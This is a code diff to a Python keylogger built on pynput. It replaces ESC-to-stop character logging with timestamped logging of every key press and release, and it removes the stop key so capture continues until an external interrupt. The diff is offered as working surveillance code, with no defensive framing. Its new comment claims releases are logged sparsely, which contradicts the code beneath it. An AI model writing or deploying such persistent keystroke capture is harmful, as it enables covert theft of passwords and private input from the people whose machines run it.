@@ -80,36 +80,17 @@ def format_key(key):
 
 
 def on_press(key):
-    try:
-        # If the key is a character, write it directly
-        with open("keylog.txt", "a") as f:
-            f.write(key.char)
-    except AttributeError:
-        # Handle special keys
-        with open("keylog.txt", "a") as f:
-            if key == keyboard.Key.space:
-                f.write(" ")
-            elif key == keyboard.Key.enter:
-                f.write("\n")
-            elif key == keyboard.Key.backspace:
-                f.write("[BACKSPACE]")
-            elif key in [keyboard.Key.shift, keyboard.Key.shift_r,
-                         keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
-                         keyboard.Key.alt_l, keyboard.Key.alt_r]:
-                # Ignore modifier keys
-                pass
-            else:
-                f.write(f"[{key}]")
+    ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    payload = f'{ts} - PRESSED  - {format_key(key)}\n'
+    write_to_log(payload)
 
 
 def on_release(key):
-    # No need to log UNPRESSED anymore
-    if key == keyboard.Key.esc:
-        # Stop the listener if ESC is pressed
-        return False
-    
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    # we intentionally log releases more sparsely to reduce log size; comment out if you want releases
+    ts = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    payload = f'{ts} - RELEASED - {format_key(key)}\n'
+    write_to_log(payload)
+    # do not stop on any key; run until external interrupt
 
 # --- Graceful shutdown handling ---
 stop_event = threading.Event()
